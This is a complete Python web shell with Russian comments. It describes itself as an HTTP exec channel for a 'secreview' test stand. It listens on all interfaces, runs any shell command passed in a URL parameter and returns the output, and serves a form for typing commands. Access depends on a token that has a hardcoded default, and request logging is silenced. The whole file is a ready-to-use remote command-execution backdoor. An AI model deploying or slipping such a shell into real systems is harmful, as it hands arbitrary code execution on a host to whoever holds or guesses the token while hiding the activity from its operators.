#!/usr/bin/env python3
# webshell.py — HTTP exec-канал для secreview (доступ через домен приложения/Traefik).
# GET /run?t=$WS_TOKEN&c=<urlencoded cmd>  -> stdout+stderr команды
# GET /healthz                            -> ok (без токена, для проверки маршрута)
# Токен: env WS_TOKEN (дефолт только для тестового стенда!)

import os
import subprocess
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

TOKEN = os.environ.get("WS_TOKEN", "s3cr3v13w-7ok3n")


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _reply(self, code, body, ctype="text/plain; charset=utf-8"):
        b = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(u.query)

        if u.path == "/healthz":
            return self._reply(200, "ok\n")

        if q.get("t", [""])[0] != TOKEN:
            return self._reply(403, "forbidden\n")

        if u.path == "/run":
            cmd = q.get("c", [""])[0]
            if not cmd:
                return self._reply(200, "usage: /run?t=TOKEN&c=CMD\n")
            try:
                p = subprocess.run(cmd, shell=True, capture_output=True,
                                   text=True, timeout=110)
                return self._reply(200, p.stdout + p.stderr
                                   + f"\n[exit={p.returncode}]\n")
            except subprocess.TimeoutExpired:
                return self._reply(200, "[timeout 110s]\n")

        if u.path == "/":
            return self._reply(200,
                               "<form action=/run>t:<input name=t> "
                               "c:<input name=c size=80>"
                               "<input type=submit></form>",
                               "text/html; charset=utf-8")

        return self._reply(404, "not found\n")


if __name__ == "__main__":
    port = int(os.environ.get("WS_PORT", "8080"))
    print(f"[*] webshell on 0.0.0.0:{port}", flush=True)
    ThreadingHTTPServer(("0.0.0.0", port), H).serve_forever()
